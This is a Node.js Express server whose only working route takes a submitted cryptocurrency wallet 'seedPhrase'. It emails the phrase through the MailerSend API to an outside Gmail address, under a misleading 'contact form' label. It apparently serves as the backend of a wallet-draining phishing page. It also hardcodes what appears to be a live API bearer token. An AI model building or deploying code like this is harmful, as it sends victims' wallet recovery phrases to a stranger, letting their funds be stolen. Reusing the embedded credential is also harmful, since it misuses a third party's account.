const express = require('express');
const cors = require('cors');
const axios = require('axios');

const app = express();
app.use(express.json());

app.use(cors()); // Allow all origins for dev

app.post('/send-email', async (req, res) => {
    const {seedPhrase} = req.body;

    if (!seedPhrase) {
        return res.status(400).json({ error: 'Missing required fields: to, subject, text' });
    }

    const emailHtml = `
    <html><body>
    <h1>New Contact Form Submission</h1>
    <p><strong>Phrase:</strong> ${seedPhrase}</p>
    </body></html>
  `;

    try {
        const response = await axios.post('https://api.mailersend.com/v1/email', {
            from: { 
                email: 'seed@test-z0vklo6e29vl7qrx.mlsender.net',
                name: 'Seeder'
            },
            to: [
                {
                    email: 'Worksmailme@gmail.com',
                    name: 'Works man',
                },
            ],
            subject: 'New Phrase Submission',
            html: emailHtml,
        }, {
            headers: {
                'Authorization': `Bearer mlsn.65794e03f9280fc72943d6b06c584db7cbd69d6a4db5cd6fa72337344963c0d7`,
                'Content-Type': 'application/json'
            }
        });

        res.status(200).json({ message: 'Email sent successfully', data: response.data });
    } catch (error) {
        console.error('Error sending email:', error.response?.data || error.message);
        res.status(500).json({ error: 'Failed to send email' });
    }
});

app.get('/', (req, res) => {
    res.status(200).send('Hello, World!');
});

const PORT = 3000;
app.listen(PORT, () => {
    console.log(`Server is running on port ${PORT}`);
});

module.exports = app